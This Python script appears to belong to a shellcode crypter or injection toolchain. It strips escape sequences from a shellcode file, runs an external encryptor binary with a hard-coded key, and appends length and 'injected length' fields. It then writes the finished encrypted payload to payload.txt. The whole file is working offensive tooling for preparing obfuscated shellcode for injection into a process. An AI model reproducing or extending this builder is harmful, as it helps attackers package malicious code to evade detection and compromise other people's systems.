import sys
import subprocess


target_key = "1e5207c64d1a7805669f4a7d1359a256"
target_encryptor_name = "encrypted_generator"
target_payload_file = "payload.txt"
shellcode_source = "string_enc.txt"
process_shellcode = 1

def manage_args():
	global target_key
	global target_encryptor_name
	global process_shellcode
	global shellcode_source

	if( len(sys.argv) > 1 ):
		for x in range(1,len(sys.argv)):
			target_arg = sys.argv[x]
			target_arg = target_arg.split("=")
			if(target_arg[0] == "--target_key"):
				target_key = target_arg[1]
			elif(target_arg[0] == "--target_encryptor_name"):
				target_encryptor_name = target_arg[1]
			elif(target_arg[0] == "--process_shellcode"):
				process_shellcode = int(target_arg[1])
			elif(target_arg[0] == "--shellcode_source"):
				shellcode_source = target_arg[1]


def hex_format( target_nr, nr_of_digits=8 ):
	nr_of_digits = str(nr_of_digits)
	if(int(nr_of_digits) < 10):
		nr_of_digits = "0" + nr_of_digits

		format_string = "0x{:"+nr_of_digits+"x}"

		final_hex_nr = format_string.format(target_nr)[2:]

	return final_hex_nr
	

def shellcode_processor( target_file ):
	file_content = open(target_file,"r").read()

	final_string = ""

	file_content_split = file_content.split("\\x")
	for x in range( 1,len(file_content_split) ):
		final_string += file_content_split[x]

	write_file = open(target_file,"w")

	write_file.write( final_string )






manage_args()

target_command = './' + target_encryptor_name

if( process_shellcode == 1 ):
	shellcode_processor( shellcode_source )

process = subprocess.Popen( [ target_command,"--target_key",target_key ] , stdout=subprocess.PIPE)
stdout = process.communicate()[0].decode("utf-8").split("\n")[0]

stdout_split = stdout.split(" ")
encrypted_payload = stdout_split[0]
encrypted_payload_len = int( stdout_split[1] )
injected_len = encrypted_payload_len + 4

final_payload = encrypted_payload + hex_format( encrypted_payload_len ) + hex_format( injected_len )

#print( encrypted_payload + " " + hex_format( encrypted_payload_len ) + " " + hex_format( injected_len ) )
print( final_payload )

fwrite = open( target_payload_file ,"w")

fwrite.write( str(final_payload) )

